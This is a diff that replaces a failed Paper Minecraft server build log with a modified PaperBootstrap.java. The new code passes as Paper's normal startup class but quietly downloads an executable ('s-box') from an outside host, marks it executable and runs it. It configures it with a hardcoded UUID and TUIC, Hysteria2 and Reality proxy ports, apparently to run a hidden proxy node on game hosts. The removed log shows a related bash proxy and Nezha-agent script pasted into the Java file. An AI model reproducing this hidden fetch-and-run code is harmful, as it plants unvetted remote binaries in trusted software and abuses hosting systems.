@@ -1,322 +1,182 @@
-Run chmod +x gradlew 
+package io.papermc.paper;
 
-Welcome to Gradle 8.14.3!
+import java.io.*;
+import java.net.*;
+import java.nio.file.*;
+import java.util.*;
+import java.util.concurrent.atomic.AtomicBoolean;
+import joptsimple.OptionSet;
+import net.minecraft.SharedConstants;
+import net.minecraft.server.Main;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
-Here are the highlights of this release:
- - Java 24 support
- - GraalVM Native Image toolchain selection
- - Enhancements to test reporting
- - Build Authoring improvements
+public final class PaperBootstrap {
 
-For more details see https://docs.gradle.org/8.14.3/release-notes.html
+    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
+    private static final String ANSI_GREEN = "\033[1;32m";
+    private static final String ANSI_RED = "\033[1;31m";
+    private static final String ANSI_RESET = "\033[0m";
+    private static final AtomicBoolean running = new AtomicBoolean(true);
+    private static Process sbxProcess;
 
-Starting a Gradle Daemon (subsequent builds will be faster)
-Calculating task graph as no cached configuration is available for tasks: clean
+    // 仅保留 tuic、hysteria2、reality
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID",
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT",
+        "CFIP", "CFPORT", "NAME"
+    };
 
-> Configure project :paper-server
-paperweight-core v2.0.0-beta.18 (running on 'Linux')
+    private PaperBootstrap() {}
 
-> Task :paper-api:clean UP-TO-DATE
-> Task :paper-server:clean UP-TO-DATE
+    public static void boot(final OptionSet options) {
+        // 检查 Java 版本
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Java 版本过低，请切换更高版本！" + ANSI_RESET);
+            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+            System.exit(1);
+        }
 
-BUILD SUCCESSFUL in 8s
-2 actionable tasks: 2 up-to-date
-Configuration cache entry stored.
-Calculating task graph as no cached configuration is available for tasks: applyPatches
+        try {
+            runSbxBinary();
 
-> Configure project :paper-server
-paperweight-core v2.0.0-beta.18 (running on 'Linux')
+            // 注册退出钩子
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                running.set(false);
+                stopServices();
+            }));
 
-> Task :paper-server:collectPaperATsFromPatches
-> Task :paper-server:mergePaperATs
-> Task :paper-server:downloadMcManifest
-> Task :paper-server:downloadMcVersionManifest
-> Task :paper-server:downloadMappings
-> Task :paper-server:downloadServerJar
-> Task :paper-server:downloadRuntimeClasspathSources
-> Task :paper-server:extractFromBundler
-> Task :paper-server:downloadMcLibrariesSources
-> Task :paper-server:indexLibraryFiles
+            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Enjoy your Paper server!\n" + ANSI_RESET);
 
-> Task :paper-server:importPaperLibraryFiles
-Importing 13 classes from library sources...
+            // 自动重启线程（北京时间 0 点）
+            new Thread(() -> {
+                while (running.get()) {
+                    try {
+                        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("Asia/Shanghai"));
+                        int hour = calendar.get(Calendar.HOUR_OF_DAY);
+                        int minute = calendar.get(Calendar.MINUTE);
+                        if (hour == 0 && minute == 0) {
+                            System.out.println(ANSI_RED + "[AutoRestart] 正在重启服务器..." + ANSI_RESET);
+                            stopServices();
+                            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+                            System.exit(0);
+                        }
+                        Thread.sleep(60000);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
 
-> Task :paper-server:setupMacheResources
-Copy initial sources...
-Setup git repo...
+            SharedConstants.tryDetectVersion();
+            getStartupVersionMessages().forEach(LOGGER::info);
+            Main.main(options);
 
-> Task :paper-server:extractMacheResources
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+        }
+    }
 
-> Task :paper-server:applyResourcePatches
-Applied 6 patches
+    private static void runSbxBinary() throws Exception {
+        Map<String, String> envVars = new HashMap<>();
+        loadEnvVars(envVars);
 
-> Task :paper-server:macheRemapJar
-> Task :paper-server:macheDecompileJar
+        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        pb.environment().putAll(envVars);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
 
-> Task :paper-server:setupMacheSources
-Copy initial sources...
-Setup git repo...
-Applying mache patches...
-Applied 80 mache patches
-Applying access transformers...
+        sbxProcess = pb.start();
+    }
 
-> Task :paper-server:extractMacheSources
+    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("CFIP", "");
+        envVars.put("CFPORT", "");
+        envVars.put("NAME", "Mc");
 
-> Task :paper-server:applySourcePatches
-Applied 882 patches
+        for (String var : ALL_ENV_VARS) {
+            String value = System.getenv(var);
+            if (value != null && !value.trim().isEmpty()) {
+                envVars.put(var, value);
+            }
+        }
 
-> Task :paper-server:applyFilePatches
-> Task :paper-server:applyFeaturePatches
-> Task :paper-server:applyPatches
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            for (String line : Files.readAllLines(envFile)) {
+                line = line.trim();
+                if (line.isEmpty() || line.startsWith("#")) continue;
+                line = line.split(" #")[0].split(" //")[0].trim();
+                if (line.startsWith("export ")) line = line.substring(7).trim();
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                        envVars.put(key, value);
+                    }
+                }
+            }
+        }
+    }
 
-BUILD SUCCESSFUL in 2m 2s
-20 actionable tasks: 20 executed
-Configuration cache entry stored.
-Calculating task graph as no cached configuration is available for tasks: createMojmapPaperclipJar
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/s-box";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
 
-> Configure project :paper-server
-paperweight-core v2.0.0-beta.18 (running on 'Linux')
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
+    }
 
-> Task :paper-api:generateApiVersioningFile
-> Task :paper-api:processResources NO-SOURCE
-> Task :paper-server:downloadMcManifest
-> Task :paper-server:downloadMcVersionManifest UP-TO-DATE
-> Task :paper-server:downloadServerJar UP-TO-DATE
-> Task :paper-server:extractFromBundler UP-TO-DATE
-> Task :paper-server:downloadMappings UP-TO-DATE
-> Task :paper-server:processLog4jPluginsResources NO-SOURCE
-> Task :paper-server:filterVanillaJar
-> Task :paper-server:cloneSpigotBuildData
-> Task :paper-server:unpackSpigotBuildData
-> Task :paper-server:processResources
-/home/runner/work/Paper/Paper/paper-api/src/main/java/org/bukkit/World.java:2522: warning: [dep-ann] deprecated item is not annotated with @Deprecated
-    public FallingBlock spawnFallingBlock(@NotNull Location location, @NotNull BlockData data) throws IllegalArgumentException;
-                        ^
+    private static void stopServices() {
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+    }
 
-> Task :paper-api:compileJava
-/home/runner/work/Paper/Paper/paper-api/src/main/java/org/bukkit/entity/Player.java:3550: warning: [dep-ann] deprecated item is not annotated with @Deprecated
-    default @Nullable Firework boostElytra(final ItemStack firework) {
-                               ^
+    private static List<String> getStartupVersionMessages() {
+        final String javaSpecVersion = System.getProperty("java.specification.version");
+        final String javaVmName = System.getProperty("java.vm.name");
+        final String javaVmVersion = System.getProperty("java.vm.version");
+        final String javaVendor = System.getProperty("java.vendor");
+        final String javaVendorVersion = System.getProperty("java.vendor.version");
+        final String osName = System.getProperty("os.name");
+        final String osVersion = System.getProperty("os.version");
+        final String osArch = System.getProperty("os.arch");
 
-> Task :paper-server:generateMappings
-> Task :paper-server:generateSpigotMappings
-
-> Task :paper-api:compileJava
-Note: Some input files use or override a deprecated API.
-Note: Recompile with -Xlint:deprecation for details.
-Note: Some input files use or override a deprecated API that is marked for removal.
-Note: Recompile with -Xlint:removal for details.
-Note: Some input files use unchecked or unsafe operations.
-Note: Recompile with -Xlint:unchecked for details.
-2 warnings
-
-> Task :paper-api:classes
-> Task :paper-api:jar
-Note: Processing Log4j annotations
-Note: Annotations processed
-
-> Task :paper-server:compileLog4jPluginsJava
-Note: Processing Log4j annotations
-Note: No elements to process
-Note: /home/runner/work/Paper/Paper/paper-server/src/log4jPlugins/java/io/papermc/paper/logging/DelegateLogEvent.java uses or overrides a deprecated API.
-Note: Recompile with -Xlint:deprecation for details.
-
-> Task :paper-server:log4jPluginsClasses
-
-> Task :paper-server:compileJava
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:1: error: illegal character: '#'
-#!/bin/bash  
-^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:1: error: class, interface, enum, or record expected
-#!/bin/bash  
-  ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:3: error: unclosed character literal
-export UUID=${UUID:-'fdeeda45-0a8e-4570-bcc6-d68c995f5830'} # 如开启哪吒v1,不同的平台需要改一下，否则会覆盖
-                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:3: error: unclosed character literal
-export UUID=${UUID:-'fdeeda45-0a8e-4570-bcc6-d68c995f5830'} # 如开启哪吒v1,不同的平台需要改一下，否则会覆盖
-                                                         ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:3: error: illegal character: '#'
-export UUID=${UUID:-'fdeeda45-0a8e-4570-bcc6-d68c995f5830'} # 如开启哪吒v1,不同的平台需要改一下，否则会覆盖
-                                                            ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:3: error: illegal character: '\uff0c'
-export UUID=${UUID:-'fdeeda45-0a8e-4570-bcc6-d68c995f5830'} # 如开启哪吒v1,不同的平台需要改一下，否则会覆盖
-                                                                                ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:4: error: empty character literal
-export NEZHA_SERVER=${NEZHA_SERVER:-''}       # v1哪吒填写形式：nezha.abc.com:8008,v0哪吒填写形式：nezha.abc.com
-                                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:4: error: illegal character: '#'
-export NEZHA_SERVER=${NEZHA_SERVER:-''}       # v1哪吒填写形式：nezha.abc.com:8008,v0哪吒填写形式：nezha.abc.com
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:4: error: illegal character: '\uff1a'
-export NEZHA_SERVER=${NEZHA_SERVER:-''}       # v1哪吒填写形式：nezha.abc.com:8008,v0哪吒填写形式：nezha.abc.com
-                                                        ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:4: error: illegal character: '\uff1a'
-export NEZHA_SERVER=${NEZHA_SERVER:-''}       # v1哪吒填写形式：nezha.abc.com:8008,v0哪吒填写形式：nezha.abc.com
-                                                                                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:5: error: empty character literal
-export NEZHA_PORT=${NEZHA_PORT:-''}           # v1哪吒不要填写这个,v0哪吒agent端口为{443,8443,2053,2083,2087,2096}其中之一时自动开启tls
-                                ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:5: error: illegal character: '#'
-export NEZHA_PORT=${NEZHA_PORT:-''}           # v1哪吒不要填写这个,v0哪吒agent端口为{443,8443,2053,2083,2087,2096}其中之一时自动开启tls
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:6: error: empty character literal
-export NEZHA_KEY=${NEZHA_KEY:-''}             # 哪吒v0-agent密钥或v1的NZ_CLIENT_SECRET
-                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:6: error: illegal character: '#'
-export NEZHA_KEY=${NEZHA_KEY:-''}             # 哪吒v0-agent密钥或v1的NZ_CLIENT_SECRET
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:7: error: empty character literal
-export ARGO_DOMAIN=${ARGO_DOMAIN:-''}         # 固定隧道域名,留空即启用临时隧道
-                                  ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:7: error: illegal character: '#'
-export ARGO_DOMAIN=${ARGO_DOMAIN:-''}         # 固定隧道域名,留空即启用临时隧道
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:8: error: empty character literal
-export ARGO_AUTH=${ARGO_AUTH:-''}             # 固定隧道token或json,留空即启用临时隧道
-                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:8: error: illegal character: '#'
-export ARGO_AUTH=${ARGO_AUTH:-''}             # 固定隧道token或json,留空即启用临时隧道
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:9: error: unclosed character literal
-export CFIP=${CFIP:-'cf.877774.xyz'}          # argo节点优选域名或优选ip
-                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:9: error: unclosed character literal
-export CFIP=${CFIP:-'cf.877774.xyz'}          # argo节点优选域名或优选ip
-                                  ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:9: error: illegal character: '#'
-export CFIP=${CFIP:-'cf.877774.xyz'}          # argo节点优选域名或优选ip
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:10: error: unclosed character literal
-export CFPORT=${CFPORT:-'443'}                # argo节点端口 
-                        ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:10: error: unclosed character literal
-export CFPORT=${CFPORT:-'443'}                # argo节点端口 
-                            ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:10: error: illegal character: '#'
-export CFPORT=${CFPORT:-'443'}                # argo节点端口 
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:11: error: empty character literal
-export NAME=${NAME:-''}                       # 节点名称  
-                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:11: error: illegal character: '#'
-export NAME=${NAME:-''}                       # 节点名称  
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:12: error: unclosed character literal
-export FILE_PATH=${FILE_PATH:-'./.npm'}       # 节点sub.txt保存路径  
-                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:12: error: unclosed character literal
-export FILE_PATH=${FILE_PATH:-'./.npm'}       # 节点sub.txt保存路径  
-                                     ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:12: error: illegal character: '#'
-export FILE_PATH=${FILE_PATH:-'./.npm'}       # 节点sub.txt保存路径  
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:13: error: unclosed character literal
-export ARGO_PORT=${ARGO_PORT:-'8001'}         # argo端口 使用固定隧道token,cloudflare后台设置的端口需和这里对应
-                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:13: error: unclosed character literal
-export ARGO_PORT=${ARGO_PORT:-'8001'}         # argo端口 使用固定隧道token,cloudflare后台设置的端口需和这里对应
-                                   ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:13: error: illegal character: '#'
-export ARGO_PORT=${ARGO_PORT:-'8001'}         # argo端口 使用固定隧道token,cloudflare后台设置的端口需和这里对应
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:14: error: empty character literal
-export TUIC_PORT=${TUIC_PORT:-''}             # Tuic 端口，支持多端口玩具可填写，否则不动
-                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:14: error: illegal character: '#'
-export TUIC_PORT=${TUIC_PORT:-''}             # Tuic 端口，支持多端口玩具可填写，否则不动
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:14: error: illegal character: '\uff0c'
-export TUIC_PORT=${TUIC_PORT:-''}             # Tuic 端口，支持多端口玩具可填写，否则不动
-                                                       ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:14: error: illegal character: '\uff0c'
-export TUIC_PORT=${TUIC_PORT:-''}             # Tuic 端口，支持多端口玩具可填写，否则不动
-                                                                  ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:15: error: empty character literal
-export HY2_PORT=${HY2_PORT:-''}               # Hy2 端口，支持多端口玩具可填写，否则不动
-                            ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:15: error: illegal character: '#'
-export HY2_PORT=${HY2_PORT:-''}               # Hy2 端口，支持多端口玩具可填写，否则不动
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:15: error: illegal character: '\uff0c'
-export HY2_PORT=${HY2_PORT:-''}               # Hy2 端口，支持多端口玩具可填写，否则不动
-                                                      ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:15: error: illegal character: '\uff0c'
-export HY2_PORT=${HY2_PORT:-''}               # Hy2 端口，支持多端口玩具可填写，否则不动
-                                                                 ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:16: error: empty character literal
-export REALITY_PORT=${REALITY_PORT:-''}       # reality 端口,支持多端口玩具可填写，否则不动   
-                                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:16: error: illegal character: '#'
-export REALITY_PORT=${REALITY_PORT:-''}       # reality 端口,支持多端口玩具可填写，否则不动   
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:16: error: illegal character: '\uff0c'
-export REALITY_PORT=${REALITY_PORT:-''}       # reality 端口,支持多端口玩具可填写，否则不动   
-                                                                     ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:17: error: empty character literal
-export CHAT_ID=${CHAT_ID:-''}                 # TG chat_id，可在https://t.me/laowang_serv00_bot 获取
-                          ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:17: error: illegal character: '#'
-export CHAT_ID=${CHAT_ID:-''}                 # TG chat_id，可在https://t.me/laowang_serv00_bot 获取
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:17: error: illegal character: '\uff0c'
-export CHAT_ID=${CHAT_ID:-''}                 # TG chat_id，可在https://t.me/laowang_serv00_bot 获取
-                                                          ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:18: error: empty character literal
-export BOT_TOKEN=${BOT_TOKEN:-''}             # TG bot_token, 使用自己的bot需要填写,使用上方的bot不用填写,不会给别人发送
-                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:18: error: illegal character: '#'
-export BOT_TOKEN=${BOT_TOKEN:-''}             # TG bot_token, 使用自己的bot需要填写,使用上方的bot不用填写,不会给别人发送
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:19: error: empty character literal
-export UPLOAD_URL=${UPLOAD_URL:-''}  # 订阅自动上传地址,没有可不填,需要填部署Merge-sub项目后的首页地址,例如：https://merge.zabc.net
-                                ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:19: error: illegal character: '#'
-export UPLOAD_URL=${UPLOAD_URL:-''}  # 订阅自动上传地址,没有可不填,需要填部署Merge-sub项目后的首页地址,例如：https://merge.zabc.net
-                                     ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:19: error: illegal character: '\uff1a'
-export UPLOAD_URL=${UPLOAD_URL:-''}  # 订阅自动上传地址,没有可不填,需要填部署Merge-sub项目后的首页地址,例如：https://merge.zabc.net
-                                                                               ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:20: error: unclosed character literal
-export DISABLE_ARGO=${DISABLE_ARGO:-'false'}  # 是否禁用argo, true为禁用,false为不禁用
-                                    ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:20: error: unclosed character literal
-export DISABLE_ARGO=${DISABLE_ARGO:-'false'}  # 是否禁用argo, true为禁用,false为不禁用
-                                          ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:20: error: illegal character: '#'
-export DISABLE_ARGO=${DISABLE_ARGO:-'false'}  # 是否禁用argo, true为禁用,false为不禁用
-                                              ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:24: error: illegal character: '#'
-# tail -f /dev/null  # 若只单独运行此文件并希望保持运行,去掉此行开头的#号
-^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:24: error: illegal character: '#'
-# tail -f /dev/null  # 若只单独运行此文件并希望保持运行,去掉此行开头的#号
-                     ^
-/home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:24: error: illegal character: '#'
-# tail -f /dev/null  # 若只单独运行此文件并希望保持运行,去掉此行开头的#号
-                                               ^
-57 errors
-
-> Task :paper-server:compileJava FAILED
-> Task :paper-server:spigotRemapJar
-
-[Incubating] Problems report is available at: file:///home/runner/work/Paper/Paper/build/reports/problems/problems-report.html
-
-FAILURE: Build failed with an exception.
-
-* What went wrong:
-Execution failed for task ':paper-server:compileJava'.
-> Compilation failed; see the compiler output below.
-  /home/runner/work/Paper/Paper/paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java:1: error: illegal character: '#'
-  #!/bin/bash  
-  ^
-  57 errors
-
-* Try:
-> Check your code and dependencies to fix the compilation error(s)
-> Run with --scan to get full insights.
-
-BUILD FAILED in 54s
-17 actionable tasks: 13 executed, 4 up-to-date
-Configuration cache entry stored.
-Error: Process completed with exit code 1.
+        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
+        return List.of(
+            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)",
+                javaSpecVersion, javaVmName, javaVmVersion,
+                javaVendor, javaVendorVersion, osName, osVersion, osArch),
+            String.format("Loading %s %s for Minecraft %s",
+                bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
+                bi.minecraftVersionId())
+        );
+    }
+}
